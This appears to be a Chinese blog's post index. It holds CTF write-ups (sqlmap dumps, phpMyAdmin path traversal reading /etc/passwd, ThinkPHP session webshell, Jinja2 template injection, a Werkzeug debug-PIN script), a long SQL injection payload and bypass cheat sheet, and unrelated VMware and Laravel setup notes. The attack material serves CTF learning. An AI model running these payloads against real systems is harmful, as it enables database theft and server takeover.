--dbs 爆表 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms --tables 爆字段 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms -T manage --columns 爆内容 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms -T manage -C user,password --dump 得到用户名和密码后,由于密码MD5加密了,所以用md5解密一下,得到密码登录系统,根据提示找到key 后台登录 打开发现静止访问,但是响应码为200说明可能因为是后台登录系统做了限制,改xff头后顺利访问 使用万能密码登录,成功获取key phpmyadmin 根目录下面的robots.txt指明了key的位置 通过增加常用文件名phpmyadmin,成功找到登录地址 用弱口令root/root登录后,先尝试包含/etc/passwd判断目录层级 1http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 然后再去包含key 1http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"GYCTF——2020i春秋新春战疫CTF——网络安全公益赛","date":"2020-02-24T16:00:00.000Z","path":"2020/02/25/CTF_WP/gyctf_wp/","text":"GYCTF——2020i春秋新春战疫CTF——网络安全公益赛MISCcode_in_morse下载下来是压缩包,解压是流量包,用wireshark分析,过滤http 发现上传文件的upload.php,跟踪流里面是morse码,morse解码是一堆字母加数字,很像base64,但是其中没有1没有8数字只要2-7,因为上传的是文件,base32解码成文件,下面这个工具解码得到一个图片 Base32 Decode File 图片不知道是什么,用google识图搜索后发现一种很类似的条形码格式PDF417,随认为是该种条形码,用一下工具进行识别,识别出一个网站,网站是一张图片 条形码二维码识别 Stegsolve分析文件格式出现F5,是F5隐写,用GitHub的F5隐写工具解密,没有密码,得到flag WEB简单的招聘系统这个题拿到手先是一个登录框,尝试了万能密码什么的发现总是未知错误,以为是我的原因,经群里大佬提醒容器不稳定,重新下发,发现万能密码登录成功 浏览各个页面发现AdminPage有一个serach for key的查询框 尝试sql注入,有回显,有错误提示,直接有回显的sql注入一套,得flag 123456789101112131415161718&#39; or 1&#x3D;1 order by 5#&#39; or 1&#x3D;1 order by 6##5有回显,6没有&#39; or 1&#x3D;1 union select 1,2,3,4,5##admin变成2,输出位置在2&#39; or 1&#x3D;1 union select 1,group_concat(database()),3,4,5##查库&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()##查表&#39; or 1&#x3D;1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;##查字段&#39; or 1&#x3D;1 union select 1,group_concat(flaaag),3,4,5 from flag##查内容 equpload这个题也很简单,直接上传一句话getshell,读取根目录下面的flag (没有任何过滤?不知道是不是主办方的失误,无从得知) blacklist过滤了set|prepare|alter|rename|select|update|delete|drop|insert|where| 但是mysql还有一种查询姿势 1234561&#39;;show tables;#查表1&#39;;desc FlagHere;#查字段1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;##读取内容 easy_thinking这个利用的是ThinkPHP&lt;6.0.2的一个任意文件内容写入覆盖漏洞 可以通过控制cookies中的PHPSESSIONID字段内容来达到控制session目录下生成的文件名 详情可以查看 ThinkPHP&lt;6.0.2任意文件内容写入/覆盖 网站目录下有www.zip.下载下来查看控制器文件,发现session文件内容存储的是查询页的key值 注册,登录,构造查询页面的key为一句话木马,cookies下面的PHPSESSIONID字段PHPSESSID=1234567890123456789012345678.php 然后访问用蚁剑链接 1http:&#x2F;&#x2F;123.57.212.112:7891&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php getshell 查看php.ini是禁用了系统执行函数的,这时需要使用蚁剑的绕过disable_function的插件选择模式进行链接,成功绕过disable_function后即可执行根目录下面readflag flaskapp在decode亚目输入123发现debug页面,分析页面,得出页面路径 得出formate格式化字符串漏洞,配合发现jinja2模板注入 尝试去获取6个变量值 1234567891011121314151617181920212223242526272829303132333435363738394041424344username # 用户名modname # flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flaskgetattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径uuid.getnode() # mac地址十进制get_machine_id() # &#x2F;etc&#x2F;machine-id&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9结果 ： root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falseflaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfSAgMAC地址:02:42:ac:12:00:0aMAC地址十进制:2485377957898&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV912:freezer:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 11:cpuset:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 10:cpu,cpuacct:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 8:hugetlb:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 7:blkio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 6:memory:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 5:pids:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 4:net_cls,net_prio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 3:rdma:&#x2F; 2:perf_event:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 1:name&#x3D;systemd:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 0::&#x2F;system.slice&#x2F;containerd.service&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;machine-id&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9tYWNoaW5lLWlkJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;81ef01dec0f0eb6d6c0f3752b487b10e 利用获取到的信息爆破pin 123456789101112131415161718192021222324252627282930313233343536373839404142import hashlibfrom itertools import chainprobably_public_bits &#x3D; [ &#39;flaskweb&#39;,# username &#39;flask.app&#39;,# modname &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [ &#39;2485377957898&#39;,# str(uuid.getnode()), &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address &#39;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#39; # get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&#39;utf-8&#39;) h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None: h.update(b&#39;pinsalt&#39;) num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv &#x3D; numprint(rv) 利用pin码进入debug界面 读取flag 123import osos.listdir(&#39;&#x2F;&#39;)open(&#39;this_is_the_flag.txt&#39;,&#39;r&#39;).read()","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"sql注入总结","date":"2020-02-10T16:00:00.000Z","path":"2020/02/11/CTF/sql注入总结/","text":"sql注入总结0x00前言 SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库 常见SQL注入类型有: 按变量类型 字符型 数字型 按HTTP提交方式 GET POST Cookies head中 User-Agent Referer 按从服务器接收到的响应 显错注入(没有关闭错误显示,会显示mysql error) 盲注(只会告诉你sql语句的执行结果true or false,不会将sql语句执行结果展示给你) 基于时间 基于bool 基于报错 堆叠查询注入 基于程度和顺序的注入 一阶注入 二阶注入 0x01常用语句用于尝试Ps:–+可以用#替换，url 提交过程中 url 编码后的#为%23 or 1=1–+ ‘ or 1=1–+ “ or 1=1–+ ) or 1=1–+ ‘)or 1=1–+ “) or 1=1–+ “))or 1=1–+ 总的来说,思路为闭合前面本来sql语句中的符号,注释掉后面的符号 用于查询 （1）获取字段数 1order by n &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F; （2） 获取系统中所有数据库名 在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中 1select null,null,group_concat(schema_name) from information_schema.schemata （3）获取当前数据库名 1select null,null,...,database() （4）获取数据库中的表 1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() 或 1select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 （5）获取表中的字段 这里假设已经获取到表名为user 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; （6）获取各个字段值 这里假设已经获取到表名为user，且字段为username和password 1select null,group_concat(username,password) from users 0x02注入类型按变量类型数字型1id&#x3D;1 union select database() 字符型1234id&#x3D;1&#39; union select database()id&#x3D;1&quot; union select database()id&#x3D;1&#39;) union select database()id&#x3D;1&quot;) union select database() 按HTTP提交方式GET参考上方按变量类型 POST一般为登录框,留言板等等,以表单形式提交的字段 后端无数据处理型无数据处理,既sql语句和变量直接拼接,形式参考GET,#不需要url编码 后端有数据处理型常见数据处理 数据处理函数 preg_replace() 当代码为preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id)时,可以利用双写过滤字符,因为替换为空,而且只检测一次 例如绕过上述只需将or写出oorr即可,替换掉中间的or之后,剩下的字段就变成了or 如果匹配中没有统计大小写,还可以利用变换语句中字母的大小写进行绕过 addslashes() 字符编码问题导致绕过 设置数据库字符为gbk导致宽字节注入 使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入 编码解码导致的绕过 url解码导致绕过addslashes base64解码导致绕过addslashes json编码导致绕过addslashes 一些特殊情况导致的绕过 没有使用引号保护字符串，直接无视addslashes 使用了stripslashes 字符替换导致的绕过addslashes 宽字节注入1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27， mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此时%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 这样就达到了我们的目的。2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法 3、将utf-8的 ‘ 转换为 �’ �’or 1=1 limit 1,1# 还有很多绕过引号、双引号、逗号、空格的方法 Cookies当php会通过cookies中username等字段进行查询时可能存在注入,与POST基本一致,只是注入位置的区别 head中 User-Agent Referer XFF(X-Forward-For) 1X-Forward-For：127.0.0.1&#39; select 1,2,user() 当php会将ip,User-Agent,referer等请求头信息进行存储数据库时,可能存在注入,与POST基本一致,只是注入位置的区别,可以通过浏览器插件、浏览器编辑和重发的功能、抓包等对请求头进行更改 按从服务器接收到的响应显错注入由于php代码会将mysql中的错误展示在前端，所以很好判断，参考上方GET等 盲注基于bool ▲left(database(),1)&gt;’s’ //left()函数 Explain: database()显示数据库名称 left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数 Explain： substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。 ascii()将某个字符转换为 ascii 值 ascii(substr((select database()),1,1))=98（改变第一个 1 和98的值相当于将名字一个个和字母比较，从而得到完整名字） 也可以用二分法和&gt;=’a’,between and等来判断 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数 Explain： mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值 ▲regexp 正则注入 正则注入介绍： http://www.cnblogs.com/lcamry/articles/5717442.html 用法介绍：select user() regexp ‘^[a-z]’; Explain： 正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 基于报错———————————构造payload 让信息通过错误提示回显出来—————— select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;Explain:此处有三个点， 一是需要 concat 计数， 二是 floor，取得 0 or 1，进行数据的重复， 三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为 mysql 的 bug 的问题。 但是此处需要将 rand(0)，rand()需要多试几次才行。 以上语句可以简化成如下的形式。select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果 rand 被禁用了可以使用用户变量来报错select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上可以参考 exp 报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html select !(select * from (select user())x) -（ps:这是减号） 0//bigint 超出范围；0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上 可以参考文章 bigint 溢出文章 http://www.cnblogs.com/lcamry/articles/5509112.html extractvalue(1,concat(0x7e,(select @@version),0x7e)) //mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制 updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性，此处重复了 version，所以报错 报错注入总结和示例 floor()和rand() 1union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a &#x2F;*利用错误信息得到当前数据库名*&#x2F; extractvalue() 1id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) updatexml() 1id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) geometrycollection() 1id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b)) multipoint() 1id&#x3D;1 and multipoint((select * from(select * from(select user())a)b)) polygon() 1id&#x3D;1 and polygon((select * from(select * from(select user())a)b)) multipolygon() 1id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b)) linestring() 1id&#x3D;1 and linestring((select * from(select * from(select user())a)b)) multilinestring() 1id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b)) exp() 1id&#x3D;1 and exp(~(select * from(select user())a)) 基于时间 If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleepPs： 遇到以下这种利用 sleep()延时注入语句select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8,9,.’));该语句意思是在 0-9 之间找版本号的第一位。 但是在我们实际渗透过程中， 这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。 UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep() 堆叠查询注入局限性 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序 原理 利用分号结束一句执行,从而构造多行语句进行注入攻击 按注入的程度和顺序一阶注入即直接注入，查看上述所有 二阶注入（二次注入）1、黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 2、服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。 3、黑客向服务端发送第二个与第一次不相同的请求数据信息。 4、服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 5、服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。例： 先注册一个 admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码。Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ ANDpassword=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’admin’ 0x03 基本手工注入流程要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。 1、MySQL &gt;= 5.0（1）获取字段数1order by n &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F; （2）获取系统数据库名在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中 1select null,null,schema_name from information_schema.schemata （3）获取当前数据库名1select null,null,...,database() （4）获取数据库中的表1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() 或 1select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 （5）获取表中的字段这里假设已经获取到表名为user 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; （6）获取各个字段值这里假设已经获取到表名为user，且字段为username和password 1select null,group_concat(username,password) from users 2、MySQL &lt; 5.0MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。 该方式通常用于盲注。 相关函数length(str) ：返回字符串str的长度 substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len) ：跟上面的一样，截取字符串 ascii(str) ：返回字符串str的最左面字符的ASCII代码值 ord(str) ：将字符或布尔类型转成ascll码 if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 （1）基于布尔的盲注1and ascii(substr((select database()),1,1))&gt;64 &#x2F;*判断数据库名的第一个字符的ascii值是否大于64*&#x2F; （2）基于时间的盲注1id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*&#x2F; 0x04SQL注入绕过技术 大小写绕过 双写绕过 编码绕过（url全编码、十六进制） 内联注释绕过 关键字替换 逗号绕过 substr、mid()函数中可以利用from to来摆脱对逗号的利用； limit中可以利用offset来摆脱对逗号的利用 比较符号( &gt;、&lt; )绕过（greatest、between and) 逻辑符号的替换（and=&amp;&amp; or=|| xor=| not=!） 空格绕过（用括号，+等绕过） 等价函数绕过 hex()、bin()=ascii() concat_ws()=group_concat() mid()、substr()=substring() http参数污染 id=1 union select+1,2,3+from+users+where+id=1– 变为 id=1 union select+1&amp;id=2,3+from+users+where+id=1– 缓冲区溢出绕过 (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用) 不用or and 来进行bool盲注 原理 12id&#x3D;1^1^1&#x3D;&gt;id&#x3D;1 payload 12341^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;)^1&quot;#爆库1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%s,1))&#x3D;%s)^1#爆字段","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"sql","slug":"sql","permalink":"https://yanmymickey.github.io/tags/sql/"}]},{"title":"虚拟机挂起无法恢复","date":"2020-01-15T16:00:00.000Z","path":"2020/01/16/Note/虚拟机挂起无法恢复/","text":"虚拟机挂起无法恢复挂起vmware 支持几种工作状态:关机，挂起，重新启动 挂起：下次打开虚拟机会还原到挂起时虚拟机的状态 如何做到？为了保存挂起时虚拟机状态，会在虚拟机文件夹创建一个vmess后缀的文件， 这个文件记录了虚拟机挂起状态 关于强制关闭vmware由于卡住或其他异常原因强制关闭vmware，再次开启会显示被锁住无法打开 原因：因为一个虚拟机打开，避免重复开启同一虚拟机，会创建几个lck文件夹将这个虚拟机锁住，而强制退出会导致虚拟机来不及删除这几个文件夹，下次再打开，导致读取到lck文件夹，被锁住无法打开。 解决办法删除vmess文件和所有lck文件夹 结果：会丢失保存的虚拟机状态，虚拟机重新开机 注意 如果出现程序占用无法删除的情况，可以找到占用程序关闭后再删除 这样会导致再次打开虚拟机出现正在等待连接，因为占用程序被关闭了 重启或者找到占用程序再次开启就好了","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"配置phpstorm支持laravel代码提示","date":"2020-01-11T16:00:00.000Z","path":"2020/01/12/Note/配置phpstorm支持laravel代码提示/","text":"配置phpstorm支持laravel代码提示前言安装和使用laravel-ide-helper和phpstorm中的laravel插件 laravel插件 在file-&gt;settings-&gt;plugins中搜索laravel并安装 在file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel中启用,勾选enabled选择框 两种情况配置views等提示 若laravel为phpstorm打开的项目目录,则默认配置即可用 若laravel为phpstorm打开的项目目录的子目录,则需要配置 file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel-&gt;views/templates 仿照默认的配置,从根目录开始书写路径 例如D:\\phpstudy_pro\\WWW\\blog\\app\\views laravel-ide-helper需要借助composer composer 安装 laravel-ide-helper composer require --dev barryvdh/laravel-ide-helper 配置在 「config/app.php」的 「providers」数组中加入 1Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class Laravel 版本小于 5.5 的话，需要注册提供者，5.5之后的版本laravel加入了自动注册 **注:**如果只在开发环境中安装「larave-ide-helper」，可以在「app/Providers/AppServiceProvider.php」的「register」方法中写入下面代码： 1234567public function register()&#123; if ($this-&gt;app-&gt;environment() !&#x3D;&#x3D; &#39;production&#39;) &#123; $this-&gt;app-&gt;register(\\Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class); &#125; &#x2F;&#x2F; ...&#125; 导出配置文件（如果默认配置就满足需求了，也可以忽略这一步） 1php artisan vendor:publish --provider&#x3D;&quot;Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider&quot; --tag&#x3D;config 使用123php artisan ide-helper:generate - 为 Facades 生成注释php artisan ide-helper:models - 为数据模型生成注释php artisan ide-helper:meta - 生成 PhpStorm Meta file 自动为Facades 生成注释终端输入以下命令 1php artisan ide-helper:generate 注: 如果存在文件 「bootstrap/compiled.php」 需要先删除， 可以在生成文当前运行 php artisan clear-compiled。 自动为模型生成注释为所有模型生成注释 